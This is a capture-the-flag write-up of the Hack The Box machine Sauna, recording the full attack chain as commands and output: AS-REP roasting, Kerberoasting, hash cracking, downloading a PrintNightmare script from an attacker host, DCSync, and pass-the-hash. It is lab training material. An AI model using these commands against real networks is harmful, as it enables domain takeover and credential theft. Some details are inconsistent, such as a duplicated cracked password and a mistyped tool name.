# 📄 HTB: [Machine Name: Sauna]

## Challenge Details

Category: [[CyberSecurity]], [[Active Directory]], [[Kerberoasting]], [[LPE: PrintNightmare]]

Difficulty: Medium/Hard (based on methodology complexity)

Target: Sauna (IP: $target or 10.129.95.180)

Status: #solved

Date Completed: [[2025-11-22]]

Initial Credentials: N/A (Initial access gained via AS-REPRoast on FSmith)

---

## 1. Initial Access & User Flag 🔑

Initial access was gained by discovering valid domain users via web enumeration and then leveraging a weak configuration in Active Directory for AS-REPRoasting.

|**Detail**|**Value**|
|---|---|
|**Initial User Compromised**|`FSmith`|
|**Initial Password**|`Thestrokes23`|
|**Domain**|`EGOTISTICAL-BANK.LOCAL`|
|**User Flag**|`d4c8b5caf094b0dceb36660ddb71f2b6`|

### Nmap and Host Discovery 🔎

Bash

```
# Full and service scan combined
nmap -p- -Pn $target -v --min-rate 1000 --max-rtt-timeout 1000ms --max-retries 5 -oN nmap_ports.txt && sleep 5 && nmap -Pn $target -sV -sC -v -oN nmap_sVsC.txt && sleep 5 && nmap -T5 -Pn $target -v --script vuln -oN nmap_vuln.txt
```

#### Key Open Ports

|**PORT**|**SERVICE**|**NOTES**|
|---|---|---|
|80/tcp|http|Microsoft IIS 10.0 (`Egotistical Bank :: Home`)|
|88/tcp|kerberos-sec|Active Directory KDC|
|389/tcp|ldap|Active Directory LDAP (Domain: `EGOTISTICAL-BANK.LOCAL`)|
|**445/tcp**|microsoft-ds|SMB|
|**5985/tcp**|wsman|**WinRM** (Entry point)|

### User Enumeration and AS-REPRoast 🎣

Usernames were compiled from the website's "about" page, and one was validated using Kerbrute.

Bash

```
# Kerbrute Username Enumeration on validated usernames (FSmith, HSmith, etc.)
kerbrute userenum users --dc $target -d EGOTISTICAL-BANK.LOCAL
# Key Output: [+] VALID USERNAME:       FSmith@EGOTISTICAL-BANK.LOCAL

# Extract AS-REPRoast Hash for FSmith
impacket-GetNPUsers EGOTISTICAL-BANK.LOCAL/ -dc-ip $target -usersfile users -format john -outputfile hashes.txt

# Crack Hash
john hashes.txt --wordlist=/usr/share/wordlists/rockyou.txt
# Key Output: Thestrokes23     ($krb5asrep$FSmith@EGOTISTICAL-BANK.LOCAL)
```

### Foothold (User Shell) 🚪

Bash

```
# Verify credentials and establish WinRM shell
etexec winrm $target -u 'fsmith' -p 'Thestrokes23'
# Key Output: [+] EGOTISTICAL-BANK.LOCAL\fsmith:Thestrokes23 (Pwn3d!)

evil-winrm -u fsmith -p 'Thestrokes23' -i $target

# Retrieve User Flag
*Evil-WinRM* PS C:\Users\FSmith\desktop> type user.txt
# Output: d4c8b5caf094b0dceb36660ddb71f2b6
```

---

## 2. Privilege Escalation 👑

Privilege escalation was achieved through two main routes: Kerberoasting to obtain an initial service account, followed by either the **PrintNightmare** exploit or leveraging the **`svc_loanmanager`** credentials obtained from internal enumeration for DCSync.

### Route A: Kerberoasting & PrintNightmare

#### Lateral Movement (Kerberoasting)

The first step was lateral movement from FSmith to HSmith via a Kerberoast attack.

Bash

```
# Kerberoast check using FSmith's credentials
impacket-GetUserSPNs -dc-ip $target EGOTISTICAL-BANK.LOCAL/FSmith:Thestrokes23 -request
# Key Output Snippet:
# SAUNA/HSmith.EGOTISTICALBANK.LOCAL:60111  HSmith
# Hash saved to a file named 'hash'

# Crack HSmith Hash
john hash --wordlist=/usr/share/wordlists/rockyou.txt
# Key Output: Thestrokes23     (?)
# HSmith:Thestrokes23
```

#### Local Enumeration and Credential Discovery

Bash

```
# Download and run WinPEAS
*Evil-WinRM* PS C:\Users\FSmith\Documents> wget 10.10.14.2:80/winPEASx64.exe -o winPEASx64.exe
# WinPEAS AutoLogon Output:
# DefaultDomainName: EGOTISTICALBANK
# DefaultUserName: EGOTISTICALBANK\svc_loanmanager
# DefaultPassword: Moneymakestheworldgoround!
```

#### PrintNightmare Exploitation (CVE-2021-1675)

Bash

```
# Download and execute the PrintNightmare PowerShell script
*Evil-WinRM* PS C:\Users\FSmith\Documents> wget 10.10.14.2:80/CVE-2021-1675.ps1 -o CVE-2021-1675.ps1
*Evil-WinRM* PS C:\Users\FSmith\Documents> . ./CVE-2021-1675.ps1;Invoke-Nightmare
# Key Output: [+] using default new user: adm1n | [+] using default new password: P@ssw0rd | [+] added user  as local administrator

# Verify new admin user and retrieve Root Flag
*Evil-WinRM* PS C:\users\administrator\desktop> type root.txt
# Output: 2eb0f8c9f0fd1361d3c5375c741d13e8
```

### Route B: Domain Takeover (DCSync)

Using the `svc_loanmanager` credentials found via WinPEAS, domain compromise was achieved through DCSync.

Bash

```
# DCSync (Dump NTDS.DIT secrets)
impacket-secretsdump -just-dc-ntlm EGOTISTICAL-BANK.local/svc_loanmgr:'Moneymakestheworldgoround!'@$target
# Key Output (Administrator NT Hash):
# Administrator:500:aad3b435b51404eeaad3b435b51404ee:823452073d75b9d1cf70ebdf86c7f98e:::

# Pass-The-Hash to get a PSEXEC shell as Administrator
impacket-psexec EGOTISTICAL-BANK.local/Administrator@$target -hashes :823452073d75b9d1cf70ebdf86c7f98e
# Key Output: Microsoft Windows [Version 10.0.17763.973]

# Retrieve Root Flag
C:\Users\Administrator\Desktop> type root.txt
# Output: 2eb0f8c9f0fd1361d3c5375c741d13e8
```
